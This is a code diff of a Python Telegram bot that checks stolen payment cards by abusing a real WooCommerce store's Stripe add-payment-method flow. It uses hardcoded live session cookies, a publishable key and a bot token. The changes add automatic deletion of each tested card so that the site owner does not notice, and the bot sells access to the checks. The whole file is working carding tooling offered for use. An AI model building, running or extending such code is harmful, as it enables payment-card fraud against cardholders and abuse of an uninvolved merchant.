@@ -5,25 +5,26 @@ import json
 import re
 import threading
 import os
-from typing import Optional, Dict, Any, List
+from typing import Optional, Dict, Any, List, Tuple
 from flask import Flask
 import telebot  # pip install pyTelegramBotAPI flask requests
 
 # ------------------------------------------------------------------------------------------
 # CONFIGURATION
 # ------------------------------------------------------------------------------------------
-# Replace with your actual values
 BOT_TOKEN = "7950514269:AAElXX262n31xiSn1pCxthxhuMpjw9VjtVg"
-OWNER_ID = 8241973550  # <--- REPLACE WITH YOUR TELEGRAM USER ID (Integer)
-# Example: OWNER_ID = 123456789
+OWNER_ID = 8241973550  # Your Telegram User ID
 
-# File to store allowed users (Note: On Render Free, this resets on redeploy)
+# File to store allowed users
 USERS_FILE = "allowed_users.txt"
 
 # Target Site Config
 SITE_URL = "https://infiniteautowerks.com"
 PUBLISHABLE_KEY = "pk_live_51MwcfkEreweRX4nmunyHnVjt6qSmKUgaafB7msRfg4EsQrStC8l0FlevFiuf2vMpN7oV9B5PGmIc7uNv1tdnvnTv005ZJCfrCk"
 COOKIES = """wordpress_sec_e7182569f4777e7cdbb9899fb576f3eb=hbjgyhtfr%7C1768803658%7CYqxUeXNjAKwu20bDX2VG2kndYvX3RbKMYY5BIzFEdCl%7C14873263ec0ace12b4c8926c1472fb012761f36b0d1dcfe2e7df480516bed7b5; wordpress_logged_in_e7182569f4777e7cdbb9899fb576f3eb=hbjgyhtfr%7C1768803658%7CYqxUeXNjAKwu20bDX2VG2kndYvX3RbKMYY5BIzFEdCl%7Ced82f62145a463255c68d252f811c3baaa30f700a9a0ec76d330611126f019de"""
+
+# Auto-delete cards after check (set to False to keep cards)
+AUTO_DELETE_CARDS = True
 
 # ------------------------------------------------------------------------------------------
 # USER MANAGEMENT HELPERS
@@ -52,7 +53,7 @@ def remove_allowed_user(user_id: int):
                 f.write(f"{u}\n")
 
 # ------------------------------------------------------------------------------------------
-# FLASK APP FOR HEALTH CHECKS (RENDER/PYTHONANYWHERE)
+# FLASK APP FOR HEALTH CHECKS
 # ------------------------------------------------------------------------------------------
 app = Flask(__name__)
 
@@ -61,18 +62,13 @@ def home():
     return "Bot is running!", 200
 
 def run_web_server():
-    # Use PORT env variable for Render, default to 8080
     port = int(os.environ.get("PORT", 8080))
     app.run(host='0.0.0.0', port=port)
 
 def keep_alive_ping():
-    """Pings the server every 5 minutes to prevent sleeping on some free tiers."""
     while True:
-        time.sleep(300)  # 5 minutes
+        time.sleep(300)
         try:
-            # Replace with your actual deployed URL if available
-            # e.g., url = "https://your-app-name.onrender.com"
-            # For localhost (container internal):
             port = int(os.environ.get("PORT", 8080))
             requests.get(f"http://127.0.0.1:{port}")
             print("Ping sent to keep alive")
@@ -80,7 +76,7 @@ def keep_alive_ping():
             print(f"Ping failed: {e}")
 
 # ------------------------------------------------------------------------------------------
-# STRIPE AUTOMATION LOGIC
+# COUNTRY MAP
 # ------------------------------------------------------------------------------------------
 COUNTRY_MAP = {
     'TH': 'Thailand', 'BR': 'Brazil', 'US': 'United States', 'IN': 'India',
@@ -99,6 +95,9 @@ COUNTRY_MAP = {
     'TW': 'Taiwan', 'KE': 'Kenya', 'GH': 'Ghana', 'MA': 'Morocco'
 }
 
+# ------------------------------------------------------------------------------------------
+# STRIPE AUTOMATION WITH AUTO-DELETE
+# ------------------------------------------------------------------------------------------
 class StripeWooCommerceAutomation:
     def __init__(self, site_url: str, cookies: str = None, publishable_key: str = None):
         self.site_url = site_url.rstrip('/')
@@ -123,14 +122,17 @@ class StripeWooCommerceAutomation:
             'elements_session_config_id': str(uuid.uuid4())
         }
     
-    def fetch_ajax_nonce(self) -> Optional[str]:
-        url = f"{self.site_url}/my-account/add-payment-method/"
-        headers = {
+    def _get_common_headers(self) -> Dict[str, str]:
+        return {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'accept-language': 'en-US,en;q=0.9',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
         }
+    
+    def fetch_ajax_nonce(self) -> Optional[str]:
+        url = f"{self.site_url}/my-account/add-payment-method/"
         try:
-            response = self.session.get(url, headers=headers, timeout=30)
+            response = self.session.get(url, headers=self._get_common_headers(), timeout=30)
             patterns = [
                 r'"createAndConfirmSetupIntentNonce"\s*:\s*"([a-f0-9]+)"',
                 r'_ajax_nonce["\']?\s*[:=]\s*["\']([a-f0-9]+)["\']',
@@ -146,8 +148,106 @@ class StripeWooCommerceAutomation:
                 if pk_match:
                     self.publishable_key = pk_match.group(0)
             return None
-        except requests.exceptions.RequestException:
+        except:
             return None
+    
+    def fetch_payment_methods(self) -> Tuple[List[Dict[str, Any]], Optional[str]]:
+        """Fetch all payment methods from the account for deletion."""
+        url = f"{self.site_url}/my-account/payment-methods/"
+        
+        try:
+            response = self.session.get(url, headers=self._get_common_headers(), timeout=30)
+            html = response.text
+            
+            payment_methods = []
+            delete_nonce = None
+            
+            # Pattern: /my-account/delete-payment-method/123/?_wpnonce=abc123
+            delete_pattern = r'href=["\']([^"\']*?/delete-payment-method/(\d+)/[^"\']*_wpnonce=([a-f0-9]+)[^"\']*)["\']'
+            matches = re.findall(delete_pattern, html, re.IGNORECASE)
+            
+            for full_url, token_id, nonce in matches:
+                delete_nonce = nonce
+                clean_url = full_url.replace('&amp;', '&')
+                if not clean_url.startswith('http'):
+                    clean_url = f"{self.site_url}{clean_url}"
+                
+                payment_methods.append({
+                    'token_id': token_id,
+                    'delete_url': clean_url,
+                    'nonce': nonce
+                })
+            
+            # Try to find last4 for each payment method
+            row_pattern = r'<tr[^>]*>(.*?)</tr>'
+            rows = re.findall(row_pattern, html, re.IGNORECASE | re.DOTALL)
+            
+            for row in rows:
+                delete_match = re.search(r'delete-payment-method/(\d+)/', row, re.IGNORECASE)
+                if delete_match:
+                    token_id = delete_match.group(1)
+                    
+                    # Find last4 in this row
+                    last4_match = re.search(r'(\d{4})\s*(?:</|<span|$)', row)
+                    if not last4_match:
+                        last4_match = re.search(r'(?:ending\s+in|\.{4}|\*{4})\s*(\d{4})', row, re.IGNORECASE)
+                    if not last4_match:
+                        last4_match = re.search(r'>(\d{4})<', row)
+                    
+                    if last4_match:
+                        last4 = last4_match.group(1)
+                        for pm in payment_methods:
+                            if pm['token_id'] == token_id:
+                                pm['last4'] = last4
+                                break
+            
+            # Fallback: match by position
+            if payment_methods and not any(pm.get('last4') for pm in payment_methods):
+                all_last4 = re.findall(r'(?:ending\s+in|\.{4}|\*{4}|>\s*)(\d{4})(?:\s*<|\s|$)', html, re.IGNORECASE)
+                for i, pm in enumerate(payment_methods):
+                    if i < len(all_last4):
+                        pm['last4'] = all_last4[i]
+            
+            return payment_methods, delete_nonce
+            
+        except:
+            return [], None
+    
+    def delete_payment_method(self, delete_url: str) -> Dict[str, Any]:
+        """Delete a payment method using its delete URL."""
+        headers = self._get_common_headers()
+        headers['referer'] = f"{self.site_url}/my-account/payment-methods/"
+        
+        try:
+            response = self.session.get(delete_url, headers=headers, timeout=30, allow_redirects=True)
+            success = response.status_code == 200 and '/payment-methods/' in response.url
+            
+            if success or 'deleted' in response.text.lower():
+                return {'success': True, 'message': 'Deleted'}
+            
+            return {'success': success, 'message': 'Delete completed'}
+        except Exception as e:
+            return {'success': False, 'error': str(e)}
+    
+    def delete_last_payment_method(self) -> Dict[str, Any]:
+        """Delete the most recently added payment method."""
+        payment_methods, _ = self.fetch_payment_methods()
+        
+        if not payment_methods:
+            return {'success': False, 'error': 'No payment methods found'}
+        
+        last_pm = payment_methods[-1]
+        return self.delete_payment_method(delete_url=last_pm['delete_url'])
+    
+    def delete_payment_method_by_last4(self, last4: str) -> Dict[str, Any]:
+        """Delete a payment method by its last 4 digits."""
+        payment_methods, _ = self.fetch_payment_methods()
+        
+        for pm in payment_methods:
+            if pm.get('last4') == last4:
+                return self.delete_payment_method(delete_url=pm['delete_url'])
+        
+        return {'success': False, 'error': f'No card ending in {last4}'}
     
     def create_payment_method(self, card_number, exp_month, exp_year, cvc, postal_code, country="US"):
         url = "https://api.stripe.com/v1/payment_methods"
@@ -180,7 +280,8 @@ class StripeWooCommerceAutomation:
                 'payment_method_id': result.get('id'),
                 'card_brand': result.get('card', {}).get('brand', '').upper(),
                 'card_funding': result.get('card', {}).get('funding', '').upper(),
-                'card_country': result.get('card', {}).get('country')
+                'card_country': result.get('card', {}).get('country'),
+                'last4': result.get('card', {}).get('last4')
             }
         except Exception as e:
             return {'success': False, 'error': str(e), 'response': None}
@@ -221,24 +322,49 @@ class StripeWooCommerceAutomation:
         except Exception as e:
             return {'success': False, 'error': str(e)}
 
-    def add_payment_method(self, card_number, exp_month, exp_year, cvc, postal_code="10001", country="US"):
-        # Step 1
+    def add_payment_method(self, card_number, exp_month, exp_year, cvc, postal_code="10001", country="US", auto_delete=True):
+        """Complete flow: Create, Confirm, and optionally Delete payment method."""
+        
+        # Step 1: Create Payment Method with Stripe
         pm = self.create_payment_method(card_number, exp_month, exp_year, cvc, postal_code, country)
         if not pm['success']:
             err = pm.get('response', {}).get('error', {}).get('message', 'Unknown Stripe Error')
-            return {'success': False, 'msg': f"Stripe Token Failed: {err}", 'data': pm}
+            return {'success': False, 'msg': f"Stripe Token Failed: {err}", 'data': pm, 'deleted': False}
         
-        # Step 2
+        card_last4 = pm.get('last4')
+        
+        # Step 2: Fetch AJAX Nonce
         nonce = self.fetch_ajax_nonce()
         if not nonce:
-            return {'success': False, 'msg': "Failed to get AJAX Nonce from site", 'data': pm}
+            return {'success': False, 'msg': "Failed to get AJAX Nonce from site", 'data': pm, 'deleted': False}
         
-        # Step 3
+        # Step 3: Confirm Setup Intent
         confirm = self.confirm_setup_intent(pm['payment_method_id'], nonce)
-        if confirm['success']:
-            return {'success': True, 'msg': "Approved", 'data': pm}
-        else:
-            return {'success': False, 'msg': f"Declined: {confirm.get('error_message')}", 'data': pm}
+        
+        result = {
+            'success': confirm['success'],
+            'msg': "Approved" if confirm['success'] else f"Declined: {confirm.get('error_message')}",
+            'data': pm,
+            'deleted': False
+        }
+        
+        # Step 4: Auto-delete if successful and enabled
+        if confirm['success'] and auto_delete:
+            # Wait 2 seconds for card to appear in payment methods list
+            time.sleep(2)
+            
+            # Try to delete by last4 first
+            delete_result = None
+            if card_last4:
+                delete_result = self.delete_payment_method_by_last4(card_last4)
+            
+            # Fallback: delete last payment method
+            if not delete_result or not delete_result.get('success'):
+                delete_result = self.delete_last_payment_method()
+            
+            result['deleted'] = delete_result.get('success', False)
+        
+        return result
 
 # ------------------------------------------------------------------------------------------
 # TELEGRAM BOT HANDLERS
@@ -247,7 +373,6 @@ bot = telebot.TeleBot(BOT_TOKEN)
 
 def parse_card_pipe(text):
     text = text.strip()
-    # Simple regex for pipe or common separation
     match = re.search(r'(\d{15,16})[|/:\s]+(\d{1,2})[|/:\s]+(\d{2,4})[|/:\s]+(\d{3,4})', text)
     if match:
         return {
@@ -276,13 +401,12 @@ def send_welcome(message):
     bot.reply_to(message, welcome_text, parse_mode='Markdown')
 
 # ------------------------------------------------------------------------------------------
-# ADMIN COMMANDS (ADD/REMOVE USERS)
+# ADMIN COMMANDS
 # ------------------------------------------------------------------------------------------
 @bot.message_handler(commands=['add'])
 def add_user_command(message):
     if message.from_user.id != OWNER_ID:
-        return # Ignore non-owners
-    
+        return
     try:
         user_to_add = int(message.text.split()[1])
         save_allowed_user(user_to_add)
@@ -294,7 +418,6 @@ def add_user_command(message):
 def remove_user_command(message):
     if message.from_user.id != OWNER_ID:
         return
-    
     try:
         user_to_remove = int(message.text.split()[1])
         remove_allowed_user(user_to_remove)
@@ -306,7 +429,6 @@ def remove_user_command(message):
 def list_users_command(message):
     if message.from_user.id != OWNER_ID:
         return
-    
     users = load_allowed_users()
     if not users:
         bot.reply_to(message, "No users in allowed list.")
@@ -314,13 +436,12 @@ def list_users_command(message):
         bot.reply_to(message, f"👥 Authorized Users:\n" + "\n".join(str(u) for u in users))
 
 # ------------------------------------------------------------------------------------------
-# MAIN CHECKER CMD
+# MAIN CHECKER COMMAND
 # ------------------------------------------------------------------------------------------
 @bot.message_handler(commands=['chk'])
 def check_card_command(message):
     # Auth check
     allowed_users = load_allowed_users()
-    # Allow Owner OR users in list
     if message.from_user.id != OWNER_ID and message.from_user.id not in allowed_users:
         bot.reply_to(message, f"❌ Not authorized. Contact @llegaccy to buy access.\nYour ID: `{message.from_user.id}`", parse_mode='Markdown')
         return
@@ -350,7 +471,8 @@ def check_card_command(message):
             card_number=card['number'],
             exp_month=card['month'],
             exp_year=card['year'],
-            cvc=card['cvc']
+            cvc=card['cvc'],
+            auto_delete=AUTO_DELETE_CARDS  # Auto-delete enabled
         )
         
         # Formatting response
@@ -363,8 +485,13 @@ def check_card_command(message):
         status_emoji = "✅" if result['success'] else "❌"
         status_text = "𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃" if result['success'] else "𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃"
         
+        # Add delete status to message
+        delete_status = ""
+        if result['success'] and AUTO_DELETE_CARDS:
+            delete_status = " 🗑️" if result.get('deleted') else " ⚠️(not deleted)"
+        
         response_text = (
-            f"{status_emoji} {status_text} {status_emoji}\n\n"
+            f"{status_emoji} {status_text}{delete_status}\n\n"
             f"💳 𝐂𝐚𝐫𝐝: `{card['number']}|{card['month']}|{card['year']}|{card['cvc']}`\n"
             f"⚡ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Auth\n"
             f"ℹ️ 𝐈𝐧𝐟𝐨: {card_brand} - {card_funding}\n"
@@ -387,12 +514,11 @@ if __name__ == "__main__":
     pinger_thread.daemon = True
     pinger_thread.start()
 
-    # Start Flask Server in background (for Render/Health Checks)
-    # Threading the Flask app so bot.polling can run in main thread
+    # Start Flask Server in background
     server_thread = threading.Thread(target=run_web_server)
     server_thread.daemon = True
     server_thread.start()
 
     print("🤖 Bot Started...")
+    print(f"🗑️ Auto-delete cards: {'ON' if AUTO_DELETE_CARDS else 'OFF'}")
     bot.infinity_polling()
-
